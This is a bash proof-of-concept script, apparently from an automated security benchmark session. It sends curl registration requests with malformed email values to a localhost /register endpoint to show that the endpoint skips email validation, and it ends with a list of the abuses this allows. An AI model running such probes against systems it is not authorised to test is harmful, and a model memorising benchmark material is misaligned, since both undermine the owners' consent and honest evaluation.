#!/bin/bash
# POC: Demonstrates email validation bypass - registration accepts invalid email formats that don't conform to RFC 5322 standards
# Target: ./repo
# Created: 2025-11-10T14:44:53.362Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# Email Validation Bypass POC
# Demonstrates that the /register endpoint accepts invalid email formats

TARGET="http://localhost:3000"
ENDPOINT="/register"

echo "=== Email Validation Bypass POC ==="
echo ""

# Test 1: Invalid email - no @ symbol
echo "Test 1: Registering with invalid email 'bademail' (no @ symbol)"
RESPONSE1=$(curl -s -i -X POST "$TARGET$ENDPOINT" \
  -d "username=emailtest_$(date +%s)_1&password=test123&first_name=Test&last_name=User&email=bademail")

if echo "$RESPONSE1" | grep -q "302\|200"; then
  echo "✓ Registration successful with invalid email 'bademail'"
  echo "Response: $(echo "$RESPONSE1" | head -1)"
else
  echo "✗ Registration failed"
  echo "Response: $(echo "$RESPONSE1" | head -5)"
fi
echo ""

# Test 2: Invalid email - missing domain extension
echo "Test 2: Registering with invalid email 'notanemail' (incomplete format)"
RESPONSE2=$(curl -s -i -X POST "$TARGET$ENDPOINT" \
  -d "username=emailtest_$(date +%s)_2&password=test123&first_name=Test&last_name=User&email=notanemail")

if echo "$RESPONSE2" | grep -q "302\|200"; then
  echo "✓ Registration successful with invalid email 'notanemail'"
  echo "Response: $(echo "$RESPONSE2" | head -1)"
else
  echo "✗ Registration failed"
  echo "Response: $(echo "$RESPONSE2" | head -5)"
fi
echo ""

# Test 3: Invalid email - wrong format with hyphens
echo "Test 3: Registering with invalid email 'invalid-email-format' (missing @ and domain)"
RESPONSE3=$(curl -s -i -X POST "$TARGET$ENDPOINT" \
  -d "username=emailtest_$(date +%s)_3&password=test123&first_name=Test&last_name=User&email=invalid-email-format")

if echo "$RESPONSE3" | grep -q "302\|200"; then
  echo "✓ Registration successful with invalid email 'invalid-email-format'"
  echo "Response: $(echo "$RESPONSE3" | head -1)"
else
  echo "✗ Registration failed"
  echo "Response: $(echo "$RESPONSE3" | head -5)"
fi
echo ""

# Test 4: Valid email for comparison
echo "Test 4: Registering with valid email 'test@example.com' (should also work)"
RESPONSE4=$(curl -s -i -X POST "$TARGET$ENDPOINT" \
  -d "username=emailtest_$(date +%s)_4&password=test123&first_name=Test&last_name=User&email=test@example.com")

if echo "$RESPONSE4" | grep -q "302\|200"; then
  echo "✓ Registration successful with valid email 'test@example.com'"
  echo "Response: $(echo "$RESPONSE4" | head -1)"
else
  echo "✗ Registration failed"
  echo "Response: $(echo "$RESPONSE4" | head -5)"
fi
echo ""

echo "=== Summary ==="
echo "The application accepts both valid and invalid email formats without proper validation."
echo "This allows attackers to:"
echo "  - Register with fake/invalid email addresses"
echo "  - Bypass email verification requirements"
echo "  - Create multiple accounts for abuse"
echo "  - Prevent legitimate account recovery"